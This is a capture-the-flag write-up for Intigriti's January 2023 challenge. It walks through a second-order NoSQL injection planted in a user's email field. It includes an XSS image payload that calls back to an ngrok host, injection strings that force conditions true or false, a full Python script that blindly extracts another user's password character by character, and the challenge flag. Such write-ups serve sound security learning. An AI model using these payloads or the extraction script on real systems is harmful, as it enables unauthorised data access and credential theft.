---
Name: Intigriti January challenge (2023)
Authors: Samokosik and mrkcdl
Category: (No)SQL Injection
Link: https://challenge-0123.intigriti.io
---

## Challenge Description
>Hey there! I'm JacquesPhil and I bet I have more friends than you do! That's why I wrote this tool to prove it!

>Just input my name and be baffled by the amount of friends I have! I bet your name isn't even in here! That's because me and my friends are just way more noteworthy than you!

>One of my friends even works for Intigriti, and his password is the flag. But I'm not even worried. Somebody with less friends than me would never be able to hack this website!

>I also rollback the database every 15 minutes, that way I always have the most friends!

## Solution
Set username and password to XSS payload and get a callback to ngrok!
```html
<img src='http://078f-81-103-153-174.ngrok.io'>
```

No viable path, since no user will know to search for that string, let alone the target account (victim/admin/bot) 😆

Created user called `test` and then changed the email to `a%40a.com"` and get a 500 error when searching for `test`. Change it back to `a%40a.com` and the search function works again. 

Let's try a NoSQL injection payload `" || "1"=="1` which evaluates to `true`.
```txt
a%40a.com"+||+"1"%3d%3d"1
```

Search for `test` and it returns a user, probably the one we are looking for.
```json
{"username": "FrankSnys", "friends": 50}
```

Confirm by changing email to a condition that evaluates `false`.
```txt
a%40a.com"+||+"1"%3d%3d"2
```

Search for `test` and it returns `null`, therefore our injection is working! Now we need to extract the password for `FrankSnys` somehow 🤔

Created a solve script which loops through each char in user's passwords, checking against each printable character. Doing so also listed the available users and it turns out `PinkDraconian` was the target, as his password was `INTIGRITI{Y0uD1d1T}`

## Solve Script
Here's one to dump the flag from the target user 😎
```python
import requests
import string

url = 'https://challenge-0123.intigriti.io/'
username = 'cat'
password = 'crypto'
flag = 'INTIGRITI{'

# Create a session
session = requests.Session()

# Register user
response = session.post(url + 'login.html', data={'username': username, 'password': password})

while True:
    new_char = False
    for char in string.printable:

        # Update email (including our NoSQL payload)
        response = session.post(
            url + 'editor.html',
            data={
                'email': 'crypt@cat.hax"||this.username=="PinkDraconian"&&this.password[' + str(len(flag)) + ']=="' + char})

        # Perform search
        response = session.get(url + '/api/friends?q=' + username)

        # 'null' means char incorrect
        if response.status_code == 200 and response.text != 'null':
            new_char = True
            flag += char
            print('char: ' + char)
            break

    # End of the loop and no new char? Must have the flag!
    if not new_char or (new_char and char == '}'):
        break

# Print the flag :)
print('flag: ' + flag)
```

Could improve on the script using a binary search, e.g. [Blind SQLi binary search](https://github.com/Crypto-Cat/CTF/blob/main/web/DVWA/8-sqli.py) but I cba 😸 Here's an [awesome solution]( https://blog.huli.tw/2023/01/23/en/intigriti-0123-second-order-injection) using a ternary search to achieve the same goal with 185 requests, instead of ~600 🔥

## Resources
- [NullSweep: NoSQL Injection Cheatsheet](https://nullsweep.com/nosql-injection-cheatsheet)
- [HackTricks: Second Order SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap)
- [PayloadsAllTheThings: NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
